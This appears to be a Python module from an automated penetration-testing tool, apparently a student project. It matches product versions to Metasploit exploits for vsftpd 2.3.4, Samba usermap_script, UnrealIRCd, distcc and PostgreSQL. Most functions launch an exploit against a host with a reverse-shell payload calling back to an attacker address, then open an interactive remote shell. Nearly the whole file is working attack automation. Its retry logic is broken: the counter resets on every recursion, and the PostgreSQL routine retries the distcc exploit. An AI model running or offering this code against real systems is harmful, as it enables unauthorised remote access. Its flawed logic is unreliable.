# File with all the exploits that will be called by the main program
# DMO
# scalability

from pymetasploit3.msfrpc import MsfRpcClient

def compare_exploit(product, version):
    exploit_deck = [
        {"product": "distccd", "version": "v1", "exploit": "distcc_exec"},
        {"product": "Samba smbd", "version": "3.X - 4.X", "exploit": "usermap_script"},
        {"product": "vsftpd", "version": "2.3.4", "exploit": "vsftpd_234_backdoor"},
        {"product": "UnrealIRCd", "version": "", "exploit": "unreal_ircd_3281_backdoor"},
        {"product": "PostgreSQL DB", "version": "8.3.0 - 8.3.7", "exploit": "postgres_payload"},
        {"product": "VNC", "version": "", "exploit": "vnc_login"},
        {"product": "Apache Tomcat/Coyote JSP engine", "version": "1.1", "exploit": "tomcat_mgr_upload"},
        # Ajouter exploit ici pour scalabilité
    ]
    for exploit in exploit_deck:
        if exploit["product"] == product and exploit["version"] == version:
            return exploit["exploit"]
    return "No exploit found"

def use_exploit(exploit,host,lhost):
    func = getattr(__import__("exploit_deck"), exploit)
    endcode = func(host,lhost)
    return endcode

# LISTE DES EXPLOITS
# Ajouter les exploits ici et leur config metasploit
# Voir exploit vsftpd_234_backdoor pour exemple

def vsftpd_234_backdoor(host,lhost):
    tries = 0
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor') # On charge l'exploit
    # On configure l'exploitv
    exploit['RHOSTS'] = host
    exploit['RPORT'] = "21"
    # On lance l'exploit
    exploit.execute(payload="cmd/unix/interact")
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("Trying to find a session...")
        # We retry it
        tries += 1
        if tries < 10:
            return vsftpd_234_backdoor(host, lhost)
        else:
            return 1
        
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        shell.write('whoami')
        print("Shell ouvert à l'aide de vsftpd_234_backdoor")
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        return 0
    
def usermap_script(host,lhost):
    tries = 0
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'multi/samba/usermap_script') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    payload = client.modules.use('payload', 'cmd/unix/reverse_netcat')
    payload['LHOST'] = lhost
    payload['LPORT'] = "4446"
    exploit.execute(payload=payload)
    # On lance l'exploit
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        tries += 1
        if tries < 10:
            return usermap_script(host, lhost)
        else:
            return 1
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        print("Shell ouvert à l'aide de usermap_script")
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        return 0

def unreal_ircd_3281_backdoor(host,lhost):
    tries = 0
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    payload = client.modules.use('payload', 'cmd/unix/reverse')
    payload['LHOST'] = lhost
    payload['LPORT'] = "4445"
    # On lance l'exploit
    exploit.execute(payload=payload)
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        tries += 1
        if tries < 10:
            return unreal_ircd_3281_backdoor(host, lhost)
        else: 
            return 1
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        print("Shell ouvert à l'aide de unreal_ircd_3281_backdoor")
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        return 0

def distcc_exec(host,lhost):
    tries = 0
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'unix/misc/distcc_exec') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    payload = client.modules.use('payload', 'cmd/unix/reverse')
    payload['LHOST'] = lhost
    payload['LPORT'] = "4447"
    # On lance l'exploit
    exploit.execute(payload=payload)
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        tries += 1
        if tries < 10:
            return distcc_exec(host, lhost)
        else: 
            return 1
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        print("Shell ouvert à l'aide de distcc_exec")
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        return 0
    

def postgres_payload(host,lhost):
    tries = 0
    client = MsfRpcClient('astaroth', ssl=True) # Connexion au serveur metasploit [ NECESSAIRE ]
    exploit = client.modules.use('exploit', 'linux/postgres/postgres_payload') # On charge l'exploit
    # On configure l'exploit
    exploit['RHOSTS'] = host
    payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
    payload['LHOST'] = lhost
    payload['LPORT'] = "4448"
    # On lance l'exploit
    exploit.execute(payload=payload)
    print("Exploit launched")

    print("Checking if sessions are available...")
    if( client.sessions.list == {}):
        print("No session available")
        # We retry it
        tries += 1
        if tries < 10:
            return distcc_exec(host, lhost)
        else: 
            return 1
    else:
        print("Opening shell...")
        # We get the highest session number
        shell = client.sessions.session(list(client.sessions.list.keys())[-1])
        print(list(client.sessions.list.keys())[-1])
        # We get an interactive shell with the session
        print("Shell ouvert à l'aide de postgres_payload")
        shell.write('whoami')
        print(shell.read()) 
        while True:
            cmd = input("$ ")
            if cmd == "exit":
                break   
            shell.write(cmd)
            print(shell.read())
        shell.stop()
        return 0
    
def vnc_login(host,lhost):
    return 1

def tomcat_mgr_upload(host,lhost):
    return 1